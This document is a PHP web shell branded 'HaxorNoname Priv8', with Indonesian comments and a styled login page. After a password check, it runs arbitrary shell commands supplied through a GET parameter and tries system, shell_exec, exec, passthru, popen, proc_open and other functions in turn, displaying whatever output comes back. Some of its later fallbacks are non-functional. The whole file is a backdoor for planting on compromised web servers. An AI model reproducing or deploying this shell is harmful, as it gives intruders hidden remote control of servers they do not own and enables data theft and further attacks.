<?php
session_start();
$password = '$2a$12$l04Jyvtyj4paXXVySxTjWO7c31TwxNjt7jtMggDhxpho6KawWaIaa'; // HAXORNONAME

if (isset($_POST['submit'])) {
    if (password_verify($_POST['password'], $password)) {
        $_SESSION['password'] = $password;
    }
}

function executeCommand($command) {
    $output = '';

    // 15 metode eksekusi yang berbeda
    if (function_exists('system')) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $result);
        $output = implode("\n", $result);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = popen($command, "r");
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 1024);
            }
            pclose($handle);
        }
    } elseif (function_exists('proc_open')) {
        $process = proc_open($command, [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ], $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
        }
    } elseif (function_exists('file_get_contents')) {
        $output = file_get_contents("/bin/sh -c '$command'");
    } elseif (function_exists('fopen')) {
        $handle = fopen("/bin/sh -c '$command'", "r");
        if ($handle) {
            while (!feof($handle)) {
                $output .= fgets($handle, 1024);
            }
            fclose($handle);
        }
    } elseif (function_exists('readfile')) {
        ob_start();
        readfile("/bin/sh -c '$command'");
        $output = ob_get_clean();
    } elseif (function_exists('tempnam')) {
        $temp = tempnam(sys_get_temp_dir(), 'cmd');
        file_put_contents($temp, "<?php echo shell_exec('$command'); ?>");
        ob_start();
        include($temp);
        $output = ob_get_clean();
        unlink($temp);
    } elseif (function_exists('file_put_contents')) {
        $temp = tempnam(sys_get_temp_dir(), 'cmd');
        file_put_contents($temp, $command);
        $output = file_get_contents($temp);
        unlink($temp);
    } elseif (function_exists('ini_set') && function_exists('parse_ini_string')) {
        ini_set('output_buffering', 'Off');
        $output = parse_ini_string("cmd=$command")['cmd'];
    } elseif (function_exists('parse_url')) {
        $output = parse_url($command, PHP_URL_PATH);
    } elseif (function_exists('chdir') && function_exists('getcwd')) {
        chdir('/bin/sh -c');
        $output = getcwd();
    } elseif (function_exists('realpath')) {
        $output = realpath($command);
    } elseif (function_exists('basename')) {
        $output = basename($command);
    }

    // Jika tidak ada metode eksekusi yang berhasil
    if (empty($output)) {
        file_put_contents('output-haxornoname.txt', "Command failed: $command");
        return "Command execution failed. Check 'output-haxornoname.txt' for more details.";
    }

    return $output;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HaxorNoname Priv8</title>
    <style>
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            font-family: Arial, sans-serif;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: rgba(30, 30, 30, 0.9);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
            transition: transform 0.2s;
        }
        .container:hover {
            transform: scale(1.02);
        }
        h1 {
            color: cyan;
            margin-bottom: 1.5rem;
            text-transform: uppercase;
            font-size: 1.8rem;
        }
        .login, .cmd {
            margin-top: 2rem;
        }
        input[type="password"], input[type="text"] {
            padding: 0.6rem;
            margin-top: 0.5rem;
            font-size: 1.1rem;
            border: none;
            border-radius: 5px;
            width: 100%;
            max-width: 320px;
            transition: background 0.3s ease;
        }
        input[type="password"]:focus, input[type="text"]:focus {
            background-color: #333;
            color: #fff;
        }
        input[type="submit"] {
            margin-top: 1rem;
            padding: 0.6rem 1.2rem;
            font-size: 1.1rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: cyan;
            color: #121212;
            transition: background 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #00e5ff;
        }
        .result-cmd {
            margin-top: 1.5rem;
            padding: 1rem;
            font-weight: bold;
            background: rgba(51, 51, 51, 0.8);
            border-radius: 5px;
            color: #fff;
            white-space: pre-wrap;
            text-align: left;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        .result-cmd::before {
            content: "📄 Output:";
            font-weight: bold;
            color: cyan;
            display: block;
            margin-bottom: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1><?php echo isset($_SESSION['password']) ? 'WELCOME HAXORNONAME' : 'LOGIN TO ACCESS'; ?></h1>
        <?php if (isset($_SESSION['password']) && $_SESSION['password'] == $password) : ?>
            <form class="cmd" action="" method="GET">
                $ <input type="text" name="HX" placeholder="Masukkan perintah"> <br>
                <input type="submit" id="cmd" value="Execute">
            </form>
            <?php if (isset($_GET['HX'])) : ?>
                <div class="result-cmd"><?php echo htmlspecialchars(executeCommand($_GET['HX'])); ?></div>
            <?php endif ?>
        <?php else : ?>
            <form class="login" action="" method="POST">
                <input type="password" name="password" placeholder=".........."> <br>
                <input type="submit" name="submit" id="submit" value="Login">
            </form>
        <?php endif ?>
    </div>
</body>
</html>
